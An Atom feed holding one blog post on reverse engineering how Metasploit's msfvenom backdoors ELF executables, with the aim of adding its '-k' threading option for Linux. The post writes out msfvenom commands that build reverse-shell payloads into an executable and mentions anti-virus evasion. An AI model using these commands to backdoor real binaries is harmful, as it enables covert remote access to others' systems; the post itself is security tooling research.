<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: msfvenom | Sheep Shellcode]]></title>
  <link href="http://sheepshellcode.com/blog/categories/msfvenom/atom.xml" rel="self"/>
  <link href="http://sheepshellcode.com/"/>
  <updated>2016-04-12T20:58:40-04:00</updated>
  <id>http://sheepshellcode.com/</id>
  <author>
    <name><![CDATA[Vincent Moscatello]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Improving Msfvenom Part--1]]></title>
    <link href="http://sheepshellcode.com/blog/2014/10/28/improving-msfvenom-project/"/>
    <updated>2014-10-28T01:55:16-04:00</updated>
    <id>http://sheepshellcode.com/blog/2014/10/28/improving-msfvenom-project</id>
    <content type="html"><![CDATA[<p>This is  a progress/update on one of my current projects: improving the metasploit framework. In this part I am only doing reverse engineering/analysis of how msfvenom currently backdoors ELF files. This is all in an effort to add the “-k” functionality to ELF executables, the windows equivalent of an exe.</p>

<p>The -k flag is used by msfvenom to start a new thread for a payload that has been backdoored in an executable. This allows an attacker to preserve the original functionality of an executable while still executing the generated shellcode. This can come in quite handing for evading anti-virus. Unfortunately this feature is only available on 32-bit windows executables and msfvenom won&rsquo;t throw an error when you use this flag on a wrong file format.</p>

<p>Currently when you run the following two commands they will produce an identical executable that does not have the functionality of the &ldquo;-k&rdquo; flag.</p>

<pre><code class="bash">
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f elf -x a.out &gt; backdooredNoK

msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f elf -k -x a.out &gt; backdoored
</code></pre>

<p>This can be verified by performing an md5 hash of the two executables.</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/md5.png"></p>

<p>To figure out what MsfVenom is actually doing, the executable can be loaded into IDA disassembler for static analysis. Before the program is backdoored, the program entry point (_start) looks like this:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/normalstart.png"></p>

<p>After being backdoored the program entry point (_start) looks like this:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/backdooredstart.png"></p>

<p>The original program entry point is simply overwritten with the shellcode. This can be verified by comparing the hex view in IDA of the (_start) function to the RAW output of shellcode that can be generated by MsfVenom.</p>

<pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f raw  &gt; RAW
</code></pre>

<p>The hex dump from IDA looks like:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/Idahexdump.png"></p>

<p>This is identical to the RAW shell code:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/rawshellcode.png"></p>

<p>In order to make this projectmore manageable I&rsquo;ve broken it up into five chuncks each of which acts as its own milestone for tackling the problem.</p>

<ol>
<li>Reverse engineer Windows/Linux executables to determine how msfvenom is currently handling the &ldquo;-k&rdquo; option. (where is machine code stored, how is it triggered, is it loading libraries, etc)</li>
<li>Using the gathered information, manually construct shellcode that will start in new thread for linux executable.</li>
<li>Write script that automates the threading process of previous milestone</li>
<li>Write script that embeds the new shellcode that starts in a thread into the elf executable.</li>
<li>Interface this script with msfvenom&rsquo;s &ldquo;-k&rdquo; option</li>
</ol>

]]></content>
  </entry>
  
</feed>
